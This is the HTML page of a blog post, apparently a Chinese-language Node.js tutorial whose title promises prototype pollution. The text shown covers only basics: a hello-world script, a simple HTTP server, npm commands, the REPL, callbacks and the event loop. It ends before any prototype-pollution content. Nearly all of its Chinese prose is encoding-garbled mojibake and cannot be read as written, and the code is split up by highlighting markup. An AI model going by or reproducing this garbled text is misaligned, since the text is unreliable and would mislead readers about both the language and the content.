

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <link rel="icon" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <meta name="description" content="nodejsJavaScriptï¼š  ECMAScript(è¯­è¨€åŸºç¡€ï¼Œå¦‚ï¼šè¯­æ³•ã€æ•°æ®ç±»å‹ç»“æ„ä»¥åŠä¸€äº›å†…ç½®å¯¹è±¡) DOMï¼ˆä¸€äº›æ“ä½œé¡µé¢å…ƒç´ çš„æ–¹æ³•ï¼‰ BOMï¼ˆä¸€äº›æ“ä½œæµè§ˆå™¨çš„æ–¹æ³•ï¼‰  ä¸Šé¢æ˜¯JavaScriptçš„ç»„æˆéƒ¨åˆ†ï¼Œé‚£ä¹ˆNodejså‘¢ï¼Ÿ Nodejsï¼š  ECMAScript(è¯­è¨€åŸºç¡€ï¼Œå¦‚ï¼šè¯­æ³•ã€æ•°æ®ç±»å‹ç»“æ„ä»¥åŠä¸€äº›å†…ç½®å¯¹è±¡) os(æ“ä½œç³»ç»Ÿ) file(æ–‡ä»¶ç³»ç»Ÿ) net(ç½‘ç»œç³»ç»Ÿ) data">
<meta property="og:type" content="article">
<meta property="og:title" content="nodejs&amp;åŸå‹é“¾æ±¡æŸ“">
<meta property="og:url" content="http://example.com/2021/04/27/nodejs&Prototype-Pollution-Attack/index.html">
<meta property="og:site_name" content="ğŸ—„">
<meta property="og:description" content="nodejsJavaScriptï¼š  ECMAScript(è¯­è¨€åŸºç¡€ï¼Œå¦‚ï¼šè¯­æ³•ã€æ•°æ®ç±»å‹ç»“æ„ä»¥åŠä¸€äº›å†…ç½®å¯¹è±¡) DOMï¼ˆä¸€äº›æ“ä½œé¡µé¢å…ƒç´ çš„æ–¹æ³•ï¼‰ BOMï¼ˆä¸€äº›æ“ä½œæµè§ˆå™¨çš„æ–¹æ³•ï¼‰  ä¸Šé¢æ˜¯JavaScriptçš„ç»„æˆéƒ¨åˆ†ï¼Œé‚£ä¹ˆNodejså‘¢ï¼Ÿ Nodejsï¼š  ECMAScript(è¯­è¨€åŸºç¡€ï¼Œå¦‚ï¼šè¯­æ³•ã€æ•°æ®ç±»å‹ç»“æ„ä»¥åŠä¸€äº›å†…ç½®å¯¹è±¡) os(æ“ä½œç³»ç»Ÿ) file(æ–‡ä»¶ç³»ç»Ÿ) net(ç½‘ç»œç³»ç»Ÿ) data">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/npminit.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/PERl.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/event_loop.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/EventEmitter.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/require.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/n.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211119005530731.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/%E6%B1%A1%E6%9F%93.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211121223733792.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211122000430212.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211122183340194.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172124317.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172422442.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172602483.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172725768.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124173907879.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124174739562.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124174952093.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125001447005.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125001503138.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125003052754.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125003818514.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125082102153.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125082655288.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125084259360.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125084511998.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126173326438.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126173359572.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125170700643.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173138254.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173338485.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173430135.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126174150498.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126174434191.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126183747677.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126184235129.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126212401866.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126231450129.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126231900595.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126232004589.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211127000013927.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/%E8%AE%BF%E9%97%AE%E5%90%8E%E7%AB%AFjs%E6%96%87%E4%BB%B6.png">
<meta property="article:published_time" content="2021-04-27T14:29:42.519Z">
<meta property="article:modified_time" content="2022-03-31T14:38:01.450Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="knowledge">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/npminit.png">
  
  <title>nodejs&amp;åŸå‹é“¾æ±¡æŸ“ - ğŸ—„</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-dark-dimmed.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  


<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->

  
<link rel="stylesheet" href="/css/macpanel.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>ğŸ‘©â€ğŸ’»</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('https://raw.githubusercontent.com/kIl3rr/photo/main/post.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="nodejs&amp;åŸå‹é“¾æ±¡æŸ“">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-04-27 22:29" pubdate>
        April 27, 2021 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      34k å­—
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      NaN åˆ†é’Ÿ
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">nodejs&amp;åŸå‹é“¾æ±¡æŸ“</h1>
            
            <div class="markdown-body">
              <h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><p><strong>JavaScript</strong>ï¼š</p>
<ul>
<li><code>ECMAScript</code>(è¯­è¨€åŸºç¡€ï¼Œå¦‚ï¼šè¯­æ³•ã€æ•°æ®ç±»å‹ç»“æ„ä»¥åŠä¸€äº›å†…ç½®å¯¹è±¡)</li>
<li><code>DOM</code>ï¼ˆä¸€äº›æ“ä½œé¡µé¢å…ƒç´ çš„æ–¹æ³•ï¼‰</li>
<li><code>BOM</code>ï¼ˆä¸€äº›æ“ä½œæµè§ˆå™¨çš„æ–¹æ³•ï¼‰</li>
</ul>
<p>ä¸Šé¢æ˜¯<code>JavaScript</code>çš„ç»„æˆéƒ¨åˆ†ï¼Œé‚£ä¹ˆ<code>Nodejs</code>å‘¢ï¼Ÿ</p>
<p><strong>Nodejs</strong>ï¼š</p>
<ul>
<li><code>ECMAScript</code>(è¯­è¨€åŸºç¡€ï¼Œå¦‚ï¼šè¯­æ³•ã€æ•°æ®ç±»å‹ç»“æ„ä»¥åŠä¸€äº›å†…ç½®å¯¹è±¡)</li>
<li><code>os</code>(æ“ä½œç³»ç»Ÿ)</li>
<li><code>file</code>(æ–‡ä»¶ç³»ç»Ÿ)</li>
<li><code>net</code>(ç½‘ç»œç³»ç»Ÿ)</li>
<li><code>database</code>(æ•°æ®åº“)</li>
</ul>
<p>ç®€å•çš„è¯´ Node.js å°±æ˜¯è¿è¡Œåœ¨æœåŠ¡ç«¯çš„ JavaScriptã€‚</p>
<p>Node.js æ˜¯ä¸€ä¸ªåŸºäº Chrome JavaScript è¿è¡Œæ—¶å»ºç«‹çš„ä¸€ä¸ªå¹³å°ã€‚</p>
<p>Node.js æ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨ I/O æœåŠ¡ç«¯ JavaScript ç¯å¢ƒï¼ŒåŸºäº Google çš„ V8 å¼•æ“ï¼ŒV8 å¼•æ“æ‰§è¡Œ Javascript çš„é€Ÿåº¦éå¸¸å¿«ï¼Œæ€§èƒ½éå¸¸å¥½ã€‚</p>
<p>å®‰è£…ã€ç¯å¢ƒé…ç½®ç•¥</p>
<h2 id="ä¸€ã€è¿è¡Œè„šæœ¬"><a href="#ä¸€ã€è¿è¡Œè„šæœ¬" class="headerlink" title="ä¸€ã€è¿è¡Œè„šæœ¬"></a>ä¸€ã€è¿è¡Œè„šæœ¬</h2><p>ï¼ˆ ç•¥ï¼‰<br>ç›®çš„ï¼šç¼–å†™ç®€å•çš„ä¸€ä¸ªè„šæœ¬å¹¶è¿è¡Œ äº†è§£ nodejs</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;hello world!&quot;</span>) <span class="hljs-meta">#ä¿å­˜ä¸ºhelloworld.jsæ–‡ä»¶</span><br></code></pre></td></tr></table></figure>

<p>ç»ˆç«¯åˆ°æ­¤ç›®å½•ï¼Œ<code>node helloworld.js</code></p>
<p>æŸ¥æ‰¾å‘½ä»¤ node -h</p>
<h2 id="äºŒã€web-æœåŠ¡å™¨"><a href="#äºŒã€web-æœåŠ¡å™¨" class="headerlink" title="äºŒã€web æœåŠ¡å™¨"></a>äºŒã€web æœåŠ¡å™¨</h2><p>ä½¿ç”¨ php ç¼–å†™åç«¯ä»£ç å éƒ¨ç½²éœ€è¦ Apache æˆ– Nginx å¹¶ä¸”è¦æœ‰ mod_php å’Œ php_cgi æ‰èƒ½æˆåŠŸè§£æ php</p>
<p>nodejs ä¸ä»…èƒ½å……å½“ä¸Šè¿°æœåŠ¡å™¨çš„ä½œç”¨ è¿˜èƒ½å®ç°ä¸€ä¸ªåº”ç”¨</p>
<p>å°±ä¸Šä¾‹è€Œè¨€ nodejs çš„åº”ç”¨ç”± http æ¨¡å—ã€æœåŠ¡å™¨ã€å¤„ç†è¯·æ±‚å’Œå‘é€å“åº”</p>
<h3 id="â‘ -å¼•å…¥æ¨¡å—"><a href="#â‘ -å¼•å…¥æ¨¡å—" class="headerlink" title="â‘  å¼•å…¥æ¨¡å—"></a>â‘  å¼•å…¥æ¨¡å—</h3><p>ä½¿ç”¨ require è½½å…¥ http æ¨¡å— æŠŠå®ä¾‹åŒ–çš„ HTTP æœåŠ¡èµ‹å€¼ç»™å˜é‡ http å…¶ä¸­ require æ˜¯ nodejs è‡ªå¸¦çš„ http æ¨¡å—<br><code>var http = require(&quot;http&quot;);</code></p>
<h3 id="â‘¡-åˆ›å»ºæœåŠ¡å™¨"><a href="#â‘¡-åˆ›å»ºæœåŠ¡å™¨" class="headerlink" title="â‘¡ åˆ›å»ºæœåŠ¡å™¨"></a>â‘¡ åˆ›å»ºæœåŠ¡å™¨</h3><p>åœ¨ http æ¨¡å—ä¸­æä¾›ä¸€å‡½æ•° creatServerï¼Œå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ å¯ä»¥é€šè¿‡ listen çš„æ–¹æ³•æˆªè·</p>
<p>http.creatServe()æ–¹æ³•åˆ›å»ºæœåŠ¡å™¨ listen 8080<br>åœ¨é‡Œé¢ä½¿ç”¨ request å’Œ response æ¥æ¥æ”¶å’Œå“åº”</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//httpserver.js</span><br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">request,response</span>)</span>&#123;<br>    response.writeHead(<span class="hljs-number">200</span>,&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<span class="hljs-comment">//httpå¤´ çŠ¶æ€ç  å†…å®¹ç±»å‹</span><br>    response.end(<span class="hljs-string">&quot;The js had been called!\n&quot;</span>)<br>&#125;).listen(<span class="hljs-number">8080</span>)<span class="hljs-comment">//ç›‘å¬8080ç«¯å£</span><br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Server running at http://127.0.0.1:8080&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>é…åˆ index.html</p>
<h2 id="ä¸‰ã€npm"><a href="#ä¸‰ã€npm" class="headerlink" title="ä¸‰ã€npm"></a>ä¸‰ã€npm</h2><p>npm æ˜¯ nodejs çš„åŒ…ç®¡ç†å·¥å…· æ–°ç‰ˆçš„ nodejs å·²ç»å¸¦æœ‰ npm<br>ä½†é€šå¸¸è¦å‡çº§<code>npm install npm -g(å…¨å±€å®‰è£…)</code><br>ä¹Ÿéœ€è¦é…ç½®é•œåƒ<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code><br>å®‰è£…æ¨¡å—åˆ†ä¸ºæœ¬åœ°å®‰è£…å’Œå…¨å±€å®‰è£…</p>
<ul>
<li><p>æœ¬åœ°å®‰è£…</p>
<ol>
<li>å°†å®‰è£…åŒ…æ”¾åœ¨ ./node_modules ä¸‹ï¼ˆè¿è¡Œ npm å‘½ä»¤æ—¶æ‰€åœ¨çš„ç›®å½•ï¼‰ï¼Œå¦‚æœæ²¡æœ‰ node_modules ç›®å½•ï¼Œä¼šåœ¨å½“å‰æ‰§è¡Œ npm å‘½ä»¤çš„ç›®å½•ä¸‹ç”Ÿæˆ node_modules ç›®å½•ã€‚</li>
<li>å¯ä»¥é€šè¿‡ require() æ¥å¼•å…¥æœ¬åœ°å®‰è£…çš„åŒ…ã€‚</li>
</ol>
</li>
<li><p>å…¨å±€å®‰è£…</p>
<ol>
<li>å°†å®‰è£…åŒ…æ”¾åœ¨ /usr/local ä¸‹æˆ–è€…ä½  node çš„å®‰è£…ç›®å½•ã€‚</li>
<li>å¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡Œé‡Œä½¿ç”¨ã€‚</li>
</ol>
</li>
</ul>
<p>å¸è½½<code>npm uninstall npm</code><br>å‡çº§<code>npm update npm</code><br>æŸ¥çœ‹å®‰è£…ä¿¡æ¯<code>npm list -g</code><br>æœç´¢æ¨¡å—<code>npm search npm</code></p>
<h3 id="åˆ›å»ºæ¨¡å—"><a href="#åˆ›å»ºæ¨¡å—" class="headerlink" title="åˆ›å»ºæ¨¡å—"></a>åˆ›å»ºæ¨¡å—</h3><p>é¦–å…ˆæ¥çœ‹ä¸€ä¸ªåŒ…çš„ json ä½äº node_modules/npm çš„ package.json<br>å¯ä»¥çœ‹åˆ°æœ‰</p>
<pre><code>name - åŒ…åã€‚

version - åŒ…çš„ç‰ˆæœ¬å·ã€‚

description - åŒ…çš„æè¿°ã€‚

homepage - åŒ…çš„å®˜ç½‘ url ã€‚

author - åŒ…çš„ä½œè€…å§“åã€‚

contributors - åŒ…çš„å…¶ä»–è´¡çŒ®è€…å§“åã€‚

dependencies - ä¾èµ–åŒ…åˆ—è¡¨ã€‚å¦‚æœä¾èµ–åŒ…æ²¡æœ‰å®‰è£…ï¼Œnpm ä¼šè‡ªåŠ¨å°†ä¾èµ–åŒ…å®‰è£…åœ¨ node_module ç›®å½•ä¸‹ã€‚

repository - åŒ…ä»£ç å­˜æ”¾çš„åœ°æ–¹çš„ç±»å‹ï¼Œå¯ä»¥æ˜¯ git æˆ– svnï¼Œgit å¯åœ¨ Github ä¸Šã€‚

main - main å­—æ®µæŒ‡å®šäº†ç¨‹åºçš„ä¸»å…¥å£æ–‡ä»¶ï¼Œrequire(&#39;moduleName&#39;) å°±ä¼šåŠ è½½è¿™ä¸ªæ–‡ä»¶ã€‚è¿™ä¸ªå­—æ®µçš„é»˜è®¤å€¼æ˜¯æ¨¡å—æ ¹ç›®å½•ä¸‹é¢çš„ index.jsã€‚

keywords - å…³é”®å­—
</code></pre>
<p>npm init(ç›®å½•ä¸‹æ—  package.json å¦åˆ™ä¼šä¿®æ”¹å½“å‰çš„ package.json æ–‡ä»¶)<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/npminit.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥ç€ä½¿ç”¨ npm æ¥å‘å¸ƒæ¨¡å—(ä¸æ¼”ç¤º)</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> é¦–å…ˆåœ¨ npm èµ„æºåº“æ³¨å†Œç”¨æˆ·<code>npm adduser</code></li>
<li><input checked="" disabled="" type="checkbox"> å‘å¸ƒ<code>npm publish</code></li>
</ul>
<h2 id="å››ã€REPL-nodejs-è§£é‡Šå™¨"><a href="#å››ã€REPL-nodejs-è§£é‡Šå™¨" class="headerlink" title="å››ã€REPL nodejs è§£é‡Šå™¨"></a>å››ã€REPL nodejs è§£é‡Šå™¨</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/PERl.png" srcset="/img/loading.gif" lazyload><br>æŸ¥çœ‹ REPL å‘½ä»¤ <code>.help</code></p>
<p>å¯ä»¥ä¸å£°æ˜å˜é‡ ä½†ä¼šç›´æ¥è¾“å‡º<br>_ä¸‹åˆ’çº¿å¯ä»¥æˆªå–ä¸Šä¸€è¡¨è¾¾å¼çš„è¿ç®—ç»“æœ<br>å¯ä»¥é”®å…¥å˜é‡åè¾“å‡ºå€¼ ä¹Ÿèƒ½ä½¿ç”¨ console.log å‡½æ•°<br>node ä¸­ ctrl+c ä¸€æ¬¡é€€å‡ºå½“å‰ ä¸¤æ¬¡é€€å‡ºè§£é‡Šå™¨ ctrl+d ç›´æ¥é€€å‡ºè§£é‡Šå™¨</p>
<h2 id="äº”ã€å›è°ƒå‡½æ•°ä¸äº‹ä»¶å¾ªç¯"><a href="#äº”ã€å›è°ƒå‡½æ•°ä¸äº‹ä»¶å¾ªç¯" class="headerlink" title="äº”ã€å›è°ƒå‡½æ•°ä¸äº‹ä»¶å¾ªç¯"></a>äº”ã€å›è°ƒå‡½æ•°ä¸äº‹ä»¶å¾ªç¯</h2><h3 id="å›è°ƒ"><a href="#å›è°ƒ" class="headerlink" title="å›è°ƒ"></a>å›è°ƒ</h3><p>å…ˆæ¥çœ‹ä¸¤ä¸ªä¾‹å­</p>
<ul>
<li>é˜»å¡ 1.js</li>
</ul>
<p><code>var data = fs.readFileSync(&#39;input.txt&#39;);</code></p>
<p>è¯»å–å®Œæ–‡ä»¶ æ‰§è¡Œç¨‹åº</p>
<ul>
<li>éé˜»å¡ 2.js</li>
</ul>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fs.read<span class="hljs-constructor">File(&#x27;<span class="hljs-params">input</span>.<span class="hljs-params">txt</span>&#x27;, <span class="hljs-params">function</span> (<span class="hljs-params">err</span>, <span class="hljs-params">data</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) return console.error(err);<br>    console.log(data.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>è¯»å–æ–‡ä»¶çš„åŒæ—¶æ‰§è¡Œåé¢çš„ä»£ç  å› æ­¤æé«˜äº†ç¨‹åºçš„æ€§èƒ½ ä»è€Œæˆ‘ä»¬å¯ä»¥æŠŠéœ€è¦å¤„ç†å›è°ƒå‡½æ•°çš„å‚æ•°å†™åœ¨å›è°ƒå‡½æ•°å†…</p>
<p>å³ <strong>é˜»å¡æ˜¯æŒ‰é¡ºåºæ‰§è¡Œä»£ç çš„ éé˜»å¡å¯ä»¥ä¸æŒ‰ç…§é¡ºåºæ‰§è¡Œ</strong></p>
<h3 id="äº‹ä»¶å¾ªç¯"><a href="#äº‹ä»¶å¾ªç¯" class="headerlink" title="äº‹ä»¶å¾ªç¯"></a>äº‹ä»¶å¾ªç¯</h3><p>Node.js å¼‚æ­¥ç¼–ç¨‹çš„ç›´æ¥ä½“ç°å°±æ˜¯å›è°ƒã€‚</p>
<p>å¼‚æ­¥ç¼–ç¨‹ä¾æ‰˜äºå›è°ƒæ¥å®ç° ä½†ä¸èƒ½è¯´ä½¿ç”¨äº†å›è°ƒåç¨‹åºå°±å¼‚æ­¥åŒ–äº†</p>
<p>nodejs æ˜¯å•çº¿ç¨‹åº”ç”¨ç¨‹åº è€Œ V8 å¼•æ“æä¾›çš„å¼‚æ­¥æ‰§è¡Œå›è°ƒæ¥å£å°±å¯ä»¥å¤„ç†å¤§é‡çš„å¹¶å‘ ä»è€Œæå¤§çš„æå‡äº†æ€§èƒ½</p>
<p>nodejs çš„å‡ ä¹æ¯ä¸ª API æ¥å£éƒ½æ”¯æŒå›è°ƒå‡½æ•° æ‰€æœ‰äº‹ä»¶å‡æ˜¯ä¸Šå¸è§†è§’ å½“äº‹ä»¶è¢«æ£€æµ‹åˆ°å°±ä¼šè§¦å‘å›è°ƒå‡½æ•°<br>Node.js ä½¿ç”¨äº‹ä»¶é©±åŠ¨æ¨¡å‹ï¼Œwebserver ä¸€ç›´æ¥æ”¶è¯·æ±‚è€Œä¸ç­‰å¾…è¯»å†™æ“ä½œï¼ˆéé˜»å¡å¼ IO æˆ–äº‹ä»¶é©±åŠ¨ IOï¼‰ ç„¶åå»æœåŠ¡ä¸‹ä¸€ä¸ª web è¯·æ±‚ å½“è¿™ä¸ªè¯·æ±‚å®Œæˆ å®ƒè¢«æ”¾å›å¤„ç†é˜Ÿåˆ— å½“åˆ°è¾¾é˜Ÿåˆ—å¼€å¤´ è¿™ä¸ªç»“æœè¢«è¿”å›ç»™ç”¨æˆ· è¿™ç§æ¨¡å‹éå¸¸é«˜æ•ˆå¯æ‰©å±•æ€§ä¹Ÿéå¸¸å¼º<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/event_loop.jpg" srcset="/img/loading.gif" lazyload></p>
